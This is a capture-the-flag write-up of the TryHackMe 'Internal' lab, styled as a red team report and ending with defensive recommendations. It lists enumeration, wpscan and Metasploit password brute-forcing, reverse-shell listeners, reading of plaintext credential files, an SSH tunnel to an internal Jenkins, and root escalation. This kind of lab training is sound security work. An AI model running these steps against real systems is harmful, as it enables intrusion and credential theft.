# Red Team Engagement Report – Internal Network Compromise

WordPress → Jenkins → Root Access

**Author:** Omar Taisir Abu Zahra                 
**Lab Name:** Internal       
**Platform:** TryHackMe                     
**Target:** internal.thm                  
**Engagement Type:** Red Team / Adversary Emulation                            
**Objective:** Simulate a real-world attacker compromising an externally exposed service and achieving full system control                                       
**Final Outcome:** Root-level access obtained                               
**Assessed Difficulty:** Hard                                                                               
**Date:** 08 Jan 2026

## Executive Summary

This engagement simulated a realistic external attack against a publicly exposed web application. An attacker leveraged weak authentication controls in a WordPress deployment to gain initial access, pivoted through internal services, and ultimately escalated privileges to root.

The attack chain highlights several critical security weaknesses, including poor credential hygiene, insecure internal service exposure, and inadequate privilege separation. An external attacker with no prior access was able to fully compromise the system.

## Engagement Scope & Assumptions

Initial Access: External, unauthenticated
Allowed Techniques: Credential attacks, exploitation, lateral movement, privilege escalation
Restrictions: None
Success Criteria: Root-level system compromise

## Adversary Tradecraft Overview

Attack Path Summary:

External Reconnaissance
→ Web Application Enumeration
→ Credential Compromise
→ Remote Code Execution
→ Post-Exploitation Enumeration
→ Lateral Movement
→ Internal Service Pivot
→ Privilege Escalation

This attack path mirrors techniques commonly observed in real-world intrusions.

## Threat Mapping (MITRE ATT&CK)
T1595 – Active Scanning

T1110 – Brute Force

T1078 – Valid Accounts

T1059 – Command and Scripting Interpreter

T1021 – Remote Services (SSH)

T1046 – Network Service Discovery

T1068 – Privilege Escalation
## Phase 1 – External Reconnaissance
```bash
Objective

Identify exposed services and define the external attack surface.

Host Resolution

Local hostname mapping was performed to ensure proper name resolution.

sudo nano /etc/hosts
<MACHINE_IP> internal.thm

Network Service Enumeration

Active scanning was conducted to identify open ports and services.

nmap internal.thm -Pn -T4
nmap internal.thm -Pn -T4 -sVC -p 22,80 -oN nmap


Findings:

22/tcp – SSH

80/tcp – HTTP
```
## Phase 2 – Web Application Enumeration
```bash
Objective

Identify web applications accessible without authentication and assess their attack surface.

gobuster dir -u http://internal.thm/ \
-w /usr/share/wordlists/dirb/common.txt \
-x txt,php -t 60


Findings:

/blog endpoint discovered

WordPress CMS identified
```
## Phase 3 – Credential Access (WordPress)
```bash
Objective

Obtain valid credentials to gain authenticated access to the web application.

wpscan --url http://internal.thm/blog/ -e u

wpscan --url http://internal.thm/blog/ \
--usernames admin \
--passwords /usr/share/wordlists/rockyou.txt


Result:
Valid administrative credentials were obtained:

admin : m******s


This provided full administrative access to the WordPress dashboard.
```
## Phase 4 – Initial Foothold (Remote Code Execution)
```bash
Objective

Achieve remote command execution on the target host.

The WordPress theme editor was abused to inject a PHP reverse shell, a common real-world misconfiguration once administrative access is obtained.

rlwrap nc -lnvp 1234


Payload execution:

http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php


Execution Context:
User: www-data
```
## Phase 5 – Post-Exploitation Enumeration
```bash
Objective

Enumerate the compromised system and identify opportunities for lateral movement or privilege escalation.

id
cd /opt
ls


Credential discovery:

cat wp-save.txt


Recovered Credentials:

aubreanna : bub********123


Plaintext credentials stored on the system enabled further access.
```
## Phase 6 – Lateral Movement
```bash
Objective

Transition from a limited web shell to a stable authenticated user session.

ssh aubreanna@internal.thm
whoami


Successful SSH access significantly improved stability and control.
```
## Phase 7 – Internal Pivot (Jenkins)
```bash
Objective

Identify and access internal-only services not exposed externally.

cat jenkins.txt


An internal Jenkins service was identified.

ssh -L 8080:localhost:8080 aubreanna@internal.thm


Service access:

http://localhost:8080
```
## Phase 8 – Internal Service Exploitation (Jenkins)
```bash
Objective

Achieve command execution via an internal administrative service.

msfconsole
search jenkins
use 19
set RHOSTS localhost
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
exploit


Administrative Jenkins access was obtained.

A Groovy reverse shell was executed via the Jenkins Script Console:

rlwrap nc -lnvp 443
```
## Phase 9 – Privilege Escalation
```bash
Objective

Escalate privileges to full administrative control.

cd /opt
ls
cat note.txt

su


Root validation:

cd /root
ls -la
cat root.txt


Root access was successfully achieved.
```
## Impact Assessment
```bash
Phase	Impact
External Reconnaissance	Attack surface identified
Credential Access	WordPress admin compromise
Initial Foothold	Remote code execution
Lateral Movement	SSH user access
Internal Pivot	Jenkins compromise
Privilege Escalation	Full root access

```
## Defensive Recommendations
```bash
Enforce strong password policies and multi-factor authentication

Disable WordPress theme and plugin editors

Eliminate plaintext credential storage

Restrict access to internal services using firewall rules

Harden Jenkins authentication and permissions

Apply least-privilege principles across all services
```
